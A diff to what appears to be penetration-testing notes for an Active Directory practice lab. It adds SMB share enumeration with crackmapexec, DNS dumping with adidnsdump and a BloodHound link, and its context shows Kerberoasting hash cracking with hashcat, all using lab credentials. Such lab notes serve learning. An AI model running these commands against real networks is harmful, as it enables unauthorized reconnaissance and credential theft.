@@ -29,7 +29,7 @@ ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" 
 
 
 
-## # Kerberoasting
+## Kerberoasting
 
 Some users have an SPN tag set.
 
@@ -43,4 +43,33 @@ hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.
 
 For the first command, the hashes are stored in the file **kerberoasting.hashes**. Notice also that you can see with this command if the delegation is constrained.
 
-or you can also use
+
+
+## Enumerate shares
+
+```
+cme smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
+```
+
+
+
+## Enumerate dns
+
+> [https://github.com/dirkjanm/adidnsdump](https://github.com/dirkjanm/adidnsdump)
+
+
+
+{% embed url="https://github.com/dirkjanm/adidnsdump" %}
+
+```
+adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
+```
+
+The results are stored in a records.csv file
+
+
+
+## BloodHound
+
+{% embed url="https://github.com/fox-it/BloodHound.py" %}
+
